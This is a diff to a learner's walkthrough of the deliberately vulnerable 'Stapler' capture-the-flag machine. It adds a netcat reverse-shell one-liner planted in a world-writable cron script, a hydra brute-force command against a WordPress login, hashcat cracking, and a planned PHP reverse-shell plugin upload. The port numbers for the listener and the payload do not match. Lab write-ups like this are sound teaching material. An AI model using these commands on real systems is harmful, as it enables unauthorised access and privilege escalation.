@@ -46,7 +46,7 @@ By g0tmi1k
 * Next, let us login to the FTP server again with our set of credentials:
 ![](/screenshots/stapler/ftpLoginSHayslett.jpg)
 * There is a long list of files in the current user's directory.
-* Not sure what we should be looking out for here, so that is all here for now...
+* I was not quite sure of what to look out for initially in this long list - however, on hindsight, `apache2` is definitely noteworthy. That's the web server!
 
 # OpenSSH at Port 22
 * Interestingly, an attempted login here reveals a banner that I did not expect.
@@ -67,10 +67,22 @@ By g0tmi1k
 ![](/screenshots/stapler/webServerDirectoryContents.jpg)
 * Opening up `custom_400.html`, we see that it is the page that had been greeting us (with status code 400).
 * There is also an `index.html`, which states `Internal Index Page!`.
-* The next file of interest is `robots.txt`, which states `Disallow: /admin112233/` and `Disallow: /blogblog/`. Let us explore those 2 respective directories.
-* To-be-continued...
+* The next file of interest is `robots.txt`, which states `Disallow: /admin112233/` and `Disallow: /blogblog/`. These 2 directories contain the web server files which we discover from another set of enumeration.
 * This is probably the file that resulted in the additional response header about Dave:
 ![](/screenshots/stapler/htAccess.jpg)
+* Navigating to the `/tmp` directory, I ran [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py), which gave us a whole chunk of information.
+* According to ``, a noteworthy piece of information is found in the section on `World Writable Files`, where the file `/usr/local/sbin/cron-logrotate.sh` has rwx permissions for all.
+* Opening up the `.sh` file shows us only a line of comment code, telling "Simon that he needs to do something about this". This reinforces the fact that we are looking at the right file - the person who put in this message for Simon probably realised what a malicious person can do with this.
+![](/screenshots/stapler/cronLogRotateScript.jpg)
+* Insert `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4444 >/tmp/f` into `cron-logrotate.sh`, and run `nc -v -l -p 1234` on our Kali VM.
+* Note: The one-liner that was inserted is taken from a [cheat sheet on reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+* Note2: I thought of trying something simpler for the one-liner, but the `nc` running is from the `netcat-openbsd` package, which required something different:
+![](/screenshots/stapler/netcatVariant.jpg)
+* Several minutes later, we have a shell! Run `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell and `export TERM=xterm` to enable commands such as `clear` for our convenience:
+![](/screenshots/stapler/reverseShell.jpg)
+* Head to `/root` directory, and open `flag.txt`.
+![](/screenshots/stapler/rootDirectoryContentsColoured.jpg)
+* Fun-fact: Getting the flag this way adds colour to the directory content listing, versus getting it through exploiting Samba.
 
 # NetBIOS-SSN Samba SMBD at Port 139
 * This is even newer to me than FTP, with my only knowledge about this being that ports 137 to 139 are used for NetBIOS (Network Basic Input/Output System).
@@ -123,12 +135,11 @@ By g0tmi1k
 ![](/screenshots/stapler/niktoScan12380.jpg)
 * Note: `nikto` is a web server scanner. I knew the existence of such a scanner but I had always thought that I could get away with existing tools that were already doing a great job, based on what I had experienced in the previous challenges. Hence, my lesson here is that our usual tools of `gobuster` and `dirbuster` is not enough. `-h` specifies the host.
 * The part that screams out is actually the first result of the scan - `SSL Info`. We see later on that `The site uses SSL` appears twice. Putting two and two together, this means that we need to access the web server on port 12380 with `https`!
+* Another noteworthy piece of information from the scan results is the existence of `/phpmyadmin`.
+* Accessing `https://10.0.2.13:12380`:
 ![](/screenshots/stapler/siteWebServer12380.jpg)
 * Now before we actually see the page above that states `Internal Index Page!`, when accessing the site for the first time using https, we need to accept a certificate (click `Add Exception`):
 ![](/screenshots/stapler/certificate12380.jpg)
-
-* 
-
 * Remember what we saw under the `SSL Info` section of our `nikto` scan? They are actually information found within the certificate.
 * Having arrived at a vanilla page (whose page source is only the one-liner that greets us), we can look back at our `nikto` scan for clues on where we should search next. There are 2 entries, `/admin112233/` and `/blogblog/`. These 2 results are the same ones as what was derived earlier in SSH, except that at that point in time, I could not manage to access these 2 sites because of not knowing about `https`.
 * Let us explore `https://10.0.2.18:12380/admin112233` first:
@@ -197,6 +208,8 @@ By g0tmi1k
 * I felt that the toughest part for me here was figuring out where the `.jpeg` file is stored. I know that things would not be as straightforward as simply running the exploit code because the output was blank. Granted, I knew that the exploit code would publish a post, since I saw `publishPost`. However, going to the post or the homepage did not reveal to us the location of the `.jpeg` file. I suppose that we would have to **link our previous discovery of the uploads directory to this exploit to find the jpeg files**.
 * Let us now head to the section on MySQL since we have got a set of credentials from this plugin exploit.
 * Failed attempt: `use auxiliary/scanner/http/apache_optionsbleed` on `msfconsole` (where this version of Apache HTTP server is affected by).
+* Failed attempt: `use exploit/multi/http/wp_crop_rce` on `msfconsole` (which this version of WordPress is affected by; the IP address is different in the screenshot because it was tested on another machine):
+![](/screenshots/stapler/failed_wp_crop_rce.jpg)
 
 # Doom at Port 666
 * Visiting `http://10.0.2.18:666/` (running service Doom, which I have no idea what it truly is) results in a page displaying unreadable information:
@@ -208,6 +221,7 @@ By g0tmi1k
 ![](/screenshots/stapler/unzip666.jpg)
 * Opening `message2.jpg` shows us:
 ![](/screenshots/stapler/file666Message2.jpg)
+* It seems like there is a buffer overflow taking place when the second statement was echoed, since the first echo statement did exactly what was expected - echoing the user input's statement. However, the second string's length was probably too long.
 * I would have totally left this out, but running `strings` on the jpg file also gave us additional information (about a cookie):
 ![](/screenshots/stapler/file666Message2Strings.jpg)
 * Conclusion: Hmm, nonetheless, I suspect this entire port and service was to just throw us off the main path.
@@ -230,15 +244,19 @@ By g0tmi1k
 * Using `hashcat`, we are able to the password of user `john` within about 2.5 minutes: `incorrect`. Run `hashcat -m 400 crackThisHash.txt /usr/share/wordlists/rockyou.txt --force`:
 ![](/screenshots/stapler/hashcatJohnPasswordHash.jpg)
 * Note: The same command was used in `dc-3`, with the exception that we are using hash type 400 here, which encompasses `phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)`.
-* **To-consider**: Using `hydra` with `rockyou.txt` to get user `john` credentials.
+* I found out that the word `incorrect` is in `rockyou.txt`, but using `hydra -l john -P/usr/share/wordlists/rockyou.txt -S -s 12380 10.0.2.18 http-form-post '/blogblog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Dashboard'` to get user `john` credentials would take way too long.
 * Logging in to the WordPress admin panel with `john:incorrect` shows us a customised version of it (the usual ones that we see are for example, styled in blue):
 ![](/screenshots/stapler/wordPressAdminPage.jpg)
-* Next-step: Plugin/Theme reverse-shell code insertion.
+* I had thought of inserting the php-reverse-shell code into a plugin/themes file, but instead of seeing the button to save changes, we see `You need to make this file writable before you can save your changes.` instead. Cool - this is something new for me.
+* Since we are unable to edit the files of an existing plugin, I thought of uploading our reverse shell by adding a new plugin, but encountered this page which required **FTP credentials** as part of connection information.
+![](/screenshots/stapler/installPluginMessage.jpg)
+* I entered `SHayslett:SHayslett`, which we had found earlier, but to no avail. (Interestingly, in `Kan1shka9`'s walkthrough, the author was able to upload the php-reverse-shell PHP file successfully - it is not even a .zip file)
+![](/screenshots/stapler/installPluginFailed.jpg)
+* The mention of FTP brought me back to our directory listing finding as user `SHayslett` - indeed there is an `apache2` folder in it!
 
 # To-Explore
 * Since the certificate's Common Name is `Red.Initech`, we will add one entry in the `/etc/hosts` file - `10.0.2.18 red.initech`. (Note: case insensitive in this case)
 ![](/screenshots/stapler/hostsFile.jpg)
-* What scan reveals to us the existence of phpMyAdmin?
 * Instead of logging in to phpMyAdmin to replace hash value, can just use mySQL?
 
 # Concluding Remarks
